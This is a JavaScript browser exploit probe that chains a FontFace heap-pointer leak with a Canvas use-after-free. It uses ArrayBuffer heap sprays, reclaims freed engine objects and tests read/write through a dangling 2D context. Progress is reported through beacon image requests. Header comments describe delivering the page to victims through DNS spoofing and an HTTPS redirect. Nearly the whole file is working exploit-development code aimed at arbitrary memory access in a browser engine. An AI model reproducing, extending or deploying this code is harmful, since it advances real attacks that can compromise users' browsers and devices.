// PROBE P569: FontFace disclosure + Canvas UAF combo
//
// GOAL: Combine two primitives in one page load:
//   1. FontFace reclaim → leak 2 engine heap pointers (+0x58, +0x68)
//   2. Canvas UAF → bidirectional R/W of freed 768B context
//   Together: FontFace gives us a known heap address, Canvas UAF
//   gives us a write primitive. If both land in the same bmalloc
//   region, we can compute relative offsets and achieve targeted R/W.
//
// THE GAP: FontFace gives engine pointers (where engine objects live)
//   but NOT the address of our own ArrayBuffers. This probe tests
//   whether the FontFace-leaked addresses are in the same heap region
//   as our spray buffers, and whether we can use the Canvas UAF
//   write to create a fake object at a FontFace-leaked address.
//
// DAZ BYPASS: Uses DataView.getUint32 pairs (integer path) or
//   BigUint64Array if available. Never reads pointers as float64.
//
// DELIVERY: host.py DNS spoofing + HTTPS (User Guide redirect)

(() => {
  const B = (tag, extra = '') => {
    new Image().src = '/beacon/P569-' + encodeURIComponent(tag) +
      (extra ? '-' + encodeURIComponent(extra) : '') +
      '?t=' + performance.now().toFixed(0);
  };

  B('BOOT');

  // ============================================================
  // PART 1: FontFace heap pointer disclosure
  // ============================================================
  // Create a FontFace, let it load, then reclaim its 192B internal
  // object with a 192-byte ArrayBuffer. Engine writes 2 live heap
  // pointers at +0x58 (WeakHashSet) and +0x68 (WeakPtr).

  let fontPtrs = { lo58: 0, hi58: 0, lo68: 0, hi68: 0 };
  let fontLeakOk = false;

  const doFontLeak = (callback) => {
    try {
      // Create FontFace with a data: URI (tiny valid WOFF2 or empty)
      // Using a minimal valid font to trigger the internal alloc
      let ff = new FontFace('leak', 'url(data:font/woff2;base64,d09GMk9UVE8AAAAMAA==)');

      // Load triggers internal object allocation
      ff.load().then(() => {
        B('FONT-LOADED');
      }).catch(() => {
        B('FONT-LOAD-FAIL');
      });

      // Whether load succeeds or fails, the internal 192B object is allocated.
      // Force GC to free FontFace internals, then spray 192-byte ArrayBuffers
      // to reclaim the slot.

      // Give the engine a moment to process, then spray
      setTimeout(() => {
        // Drop the JS wrapper before spraying so it cannot retain the engine
        // object (the local binding alone kept it reachable until this timer).
        ff = null;
        // Spray 192-byte ArrayBuffers
        const FONT_SPRAY = 256;
        const fontSpray = [];
        for (let i = 0; i < FONT_SPRAY; i++) {
          const ab = new ArrayBuffer(192);
          const dv = new DataView(ab);
          // Fill with sentinel
          for (let off = 0; off < 192; off += 4) {
            dv.setUint32(off, 0xDDDD0000 | i, true);
          }
          fontSpray.push({ ab, dv });
        }

        // Check if any spray buffer got engine data written into it
        for (let i = 0; i < fontSpray.length; i++) {
          const dv = fontSpray[i].dv;
          // Check +0x58 and +0x68 for non-sentinel values
          const v58lo = dv.getUint32(0x58, true);
          const v58hi = dv.getUint32(0x5C, true);
          const v68lo = dv.getUint32(0x68, true);
          const v68hi = dv.getUint32(0x6C, true);

          const sent_lo = 0xDDDD0000 | i;
          if (v58lo !== sent_lo || v58hi !== sent_lo ||
              v68lo !== sent_lo || v68hi !== sent_lo) {
            // Something wrote into our buffer!
            B('FONT-RECLAIM', 'i=' + i);
            B('FONT-58', v58hi.toString(16).padStart(8, '0') +
              v58lo.toString(16).padStart(8, '0'));
            B('FONT-68', v68hi.toString(16).padStart(8, '0') +
              v68lo.toString(16).padStart(8, '0'));

            fontPtrs.lo58 = v58lo;
            fontPtrs.hi58 = v58hi;
            fontPtrs.lo68 = v68lo;
            fontPtrs.hi68 = v68hi;

            // Check if these look like heap pointers
            if (v58hi > 0 && v58hi < 0x00008000) {
              B('FONT-58-HEAP', 'yes');
              fontLeakOk = true;
            }
            if (v68hi > 0 && v68hi < 0x00008000) {
              B('FONT-68-HEAP', 'yes');
              fontLeakOk = true;
            }

            // Dump full 192 bytes for analysis
            for (let off = 0; off < 192; off += 8) {
              const lo = dv.getUint32(off, true);
              const hi = dv.getUint32(off + 4, true);
              if (lo !== sent_lo || hi !== sent_lo) {
                B('FONT-DUMP', '+' + off.toString(16) + ':' +
                  hi.toString(16).padStart(8, '0') +
                  lo.toString(16).padStart(8, '0'));
              }
            }
            break;
          }
        }

        if (!fontLeakOk) {
          B('FONT-NO-RECLAIM');
        }

        callback();
      }, 100);
    } catch (e) {
      B('FONT-ERR', e.name + ':' + e.message.slice(0, 60));
      callback();
    }
  };

  // ============================================================
  // PART 2: Canvas UAF with ArrayBuffer reclaim
  // ============================================================
  const doCanvasUAF = () => {
    let inner = null;
    let outer = null;

    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 150;

    const opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get() {
        inner = canvas.getContext('2d');
        return false;
      }
    });

    try {
      outer = canvas.getContext('2d', opts);
    } catch (e) {
      B('CANVAS-UAF-ERR', e.name);
      return;
    }

    if (!inner || !outer || inner === outer) {
      B('CANVAS-UAF-FAIL', 'inner=' + !!inner + ',outer=' + !!outer +
        ',same=' + (inner === outer));
      return;
    }

    B('CANVAS-UAF-OK');

    // Spray 768B ArrayBuffers
    const SPRAY = 512;
    const spray = [];
    for (let i = 0; i < SPRAY; i++) {
      const ab = new ArrayBuffer(768);
      const dv = new DataView(ab);
      for (let off = 0; off < 768; off += 8) {
        dv.setUint32(off, 0xCCCC0000 | i, true);
        dv.setUint32(off + 4, 0xEEEEEEEE, true);
      }
      spray.push({ ab, dv });
    }

    // Write through dangling inner to detect reclaim
    try {
      inner.fillStyle = '#ff0000';
    } catch (e) {
      B('CANVAS-WRITE-ERR', e.name);
    }

    // Find corrupted spray buffer
    let hitIdx = -1;
    for (let i = 0; i < spray.length; i++) {
      const dv = spray[i].dv;
      for (let off = 0; off < 768; off += 8) {
        const lo = dv.getUint32(off, true);
        const hi = dv.getUint32(off + 4, true);
        if (lo !== (0xCCCC0000 | i) || hi !== 0xEEEEEEEE) {
          hitIdx = i;
          break;
        }
      }
      if (hitIdx >= 0) break;
    }

    if (hitIdx < 0) {
      B('CANVAS-NO-RECLAIM');
      return;
    }

    B('CANVAS-RECLAIM', 'idx=' + hitIdx);

    // Dump the reclaimed buffer
    const dv = spray[hitIdx].dv;
    for (let off = 0; off < 128; off += 8) {
      const lo = dv.getUint32(off, true);
      const hi = dv.getUint32(off + 4, true);
      B('CTX-DUMP', '+' + off.toString(16) + ':' +
        hi.toString(16).padStart(8, '0') +
        lo.toString(16).padStart(8, '0'));
    }

    // ============================================================
    // PART 3: Combine — can we see FontFace pointers from Canvas?
    // ============================================================
    if (fontLeakOk) {
      B('COMBO-START');

      // The FontFace leaked pointers tell us where engine heap objects live.
      // The Canvas UAF ArrayBuffer reclaim gives us R/W over a freed slot.
      //
      // If both are in the same bmalloc region, the distance between
      // the FontFace pointer and our spray buffer address reveals our
      // spray's address (the missing self-address).
      //
      // Strategy: write a distinctive value through inner at known Canvas
      // context offsets, then scan nearby heap via the font-leaked base.

      // Check if any heap pointers in the Canvas context match the
      // FontFace-leaked address range
      for (let off = 0; off < 768; off += 8) {
        const lo = dv.getUint32(off, true);
        const hi = dv.getUint32(off + 4, true);
        // Skip our own sentinels
        if (hi === 0xEEEEEEEE) continue;
        // Check if this pointer is near the FontFace-leaked address
        if (hi === fontPtrs.hi58) {
          const dist = Math.abs(lo - fontPtrs.lo58);
          if (dist < 0x100000) {
            B('COMBO-NEAR-58', '+' + off.toString(16) +
              ':dist=' + dist.toString(16));
          }
        }
        if (hi === fontPtrs.hi68) {
          const dist = Math.abs(lo - fontPtrs.lo68);
          if (dist < 0x100000) {
            B('COMBO-NEAR-68', '+' + off.toString(16) +
              ':dist=' + dist.toString(16));
          }
        }
      }

      // Report all non-sentinel pointer-shaped values in canvas context
      let ptrCount = 0;
      for (let off = 0; off < 768; off += 8) {
        const lo = dv.getUint32(off, true);
        const hi = dv.getUint32(off + 4, true);
        if (hi === 0xEEEEEEEE) continue;
        if (hi > 0 && hi < 0x00010000) {
          ptrCount++;
          if (ptrCount <= 20) {
            B('CTX-PTR', '+' + off.toString(16) + ':' +
              hi.toString(16).padStart(8, '0') +
              lo.toString(16).padStart(8, '0'));
          }
        }
      }
      B('CTX-PTR-COUNT', String(ptrCount));
    }

    // === PHASE 4: Test bidirectional R/W ===
    // Write controlled values through the ArrayBuffer, read through inner
    try {
      // Set all bytes to 0x3F (which is 0.0 in some float layouts)
      const u8 = new Uint8Array(spray[hitIdx].ab);
      u8.fill(0x00);

      // Read globalAlpha through inner
      const alpha = inner.globalAlpha;
      B('BIDI-ALPHA-ZERO', String(alpha));

      // Now write 1.0 (0x3FF0000000000000) at every offset
      const f64view = new Float64Array(spray[hitIdx].ab);
      for (let i = 0; i < f64view.length; i++) {
        f64view[i] = 1.0;
      }
      const alpha2 = inner.globalAlpha;
      B('BIDI-ALPHA-ONE', String(alpha2));

      // Write 0.5 and check
      for (let i = 0; i < f64view.length; i++) {
        f64view[i] = 0.5;
      }
      const alpha3 = inner.globalAlpha;
      B('BIDI-ALPHA-HALF', String(alpha3));

      // Binary search for globalAlpha's offset in the context
      // Fill with 1.0, then zero one qword at a time
      for (let i = 0; i < f64view.length; i++) f64view[i] = 1.0;
      for (let off = 0; off < 768; off += 8) {
        const prev = f64view[off / 8];
        f64view[off / 8] = 0.0;
        const test = inner.globalAlpha;
        f64view[off / 8] = prev;
        if (test !== 1.0) {
          B('ALPHA-OFFSET', '+' + off.toString(16) + ':' + test);
        }
      }
    } catch (e) {
      B('BIDI-ERR', e.name + ':' + e.message.slice(0, 60));
    }

    B('DONE');
  };

  // Run FontFace first, then Canvas UAF
  doFontLeak(doCanvasUAF);

  setTimeout(() => B('ALIVE-10s'), 10000);
})();
